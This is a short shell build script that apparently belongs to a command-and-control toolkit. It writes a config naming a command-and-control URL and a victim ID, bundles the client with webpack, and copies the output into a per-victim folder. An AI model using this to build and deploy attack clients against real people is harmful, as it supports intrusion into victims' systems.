#!/bin/sh

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

REALTIMEURL=$1
VICTIMID=$2

echo "module.exports = {
    COMMAND_CONTROL_URL: '${REALTIMEURL}',
    VICTIM_ID: '${VICTIMID}'
};"  > $BASEDIR/config.js

if npm run webpack; then
    mkdir -p $BASEDIR/client_$VICTIMID
    cp -r $BASEDIR/test.html $BASEDIR/dist $BASEDIR/client_$VICTIMID
fi
